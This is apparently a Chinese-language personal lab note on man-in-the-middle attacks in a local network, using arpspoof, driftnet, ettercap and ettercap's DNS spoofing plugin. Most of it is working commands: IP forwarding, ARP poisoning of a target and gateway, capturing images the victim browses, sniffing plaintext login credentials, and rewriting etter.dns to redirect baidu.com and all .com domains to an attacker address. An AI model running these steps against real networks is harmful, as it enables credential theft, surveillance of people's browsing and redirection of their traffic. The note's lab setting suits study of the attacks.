![[Pasted image 20241018223617.png]]

源IP：网关
源mac：伪造

开启端口转发并开启arp 欺骗
echo 1 > /proc/sys/net/ipv4/ip_forward

通过以下命令确保永久启用：
`echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf 
sysctl -p`


arpspoof -i eth0 -t 192.168.163.132 -r 192.168.163.2


开启新的 shell 执行命令，该命令会自动打开一个 shell 窗口并获取目的主机所浏览的图片。
命令格式：driftnet -i 网卡
driftnet -i eth0
driftnet -i eth0 -a -d /root/hhh #相关参数解读：
-b 捕获到新的图片时发出嘟嘟声
-i interface 选择监听接口
-f file 读取一个指定pcap数据包中的图片
-p 不让所监听的接口使用混杂模式
-a 后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
-m number 指定保存图片数的数目
-d directory 指定保存图片的路径
-x prefix 指定保存图片的前缀名


arp 欺骗——获取账号密码
利用 ettercap 来抓取账号密码。在终端输入
ettercap:是一个基于ARP地址欺骗方式的网络嗅探工具，主要适用于交换局域网络。
借助于EtterCap嗅探软件，渗透测试人员可以检测网络内明文数据通讯的安全性，及时采取措施，避免敏感的用户名/密码等数据以明文的方式进行传输。

1、在物理机上找一个网站（http协议的），输入用户名和密码登录。
ettercap -Tq -i eth0
-T 文本模式运行
-q 安静模式
-i 网卡，后接网卡名 #这条命令表示监控eth0网卡的流量

2、在虚拟机中开启 ARP 欺骗，并输入命令 “ettercap -Tq -i eth0” 监测密码和账号
登录后便可抓取到账号和密码，并以明文的方式显示到屏幕上。

ARP攻击的其他相关运用：https://www.jianshu.com/p/de44827f839e



==**DNS劫持**==
1，首先修改一下DNS配置文件
vim /etc/ettercap/etter.dns
添加以下字段：
*.baidu.com A 10.0.0.9
www.*.com A 10.0.0.9
*.*.com A 10.0.0.9  #加入这段字符的意思是：

将任意开头.baidu.com的域名解析到10.0.0.9
将所有www开头，中间任意字符，以CMD结尾的域名解析到10.0.0.9
将任意开头，中间任意字符，以CMD结尾的域名解析到10.0.0.9

2，打开kali机器的ettercap工具
ettercap -G

![[1729310420605.jpg]]

3，扫描当前局域网的主机列表
![[Pasted image 20241019120042.png]]


4，将目标主机和网关分别添加到Target1和Target2中
因为是双向欺骗，因此需要添加两个组：网关为一组，目标主机为二组
![[1729310492471.jpg]] 

5、先进行arp欺骗
`sudo ettercap -T -q -i eth0 -M arp:remote /192.168.163.132// /192.168.163.2//`
![[Pasted image 20241019125104.png]]

6、再开始DNS欺骗

![[Pasted image 20241019125132.png]]![[Pasted image 20241019125147.png]]

7、ping www.baidu.com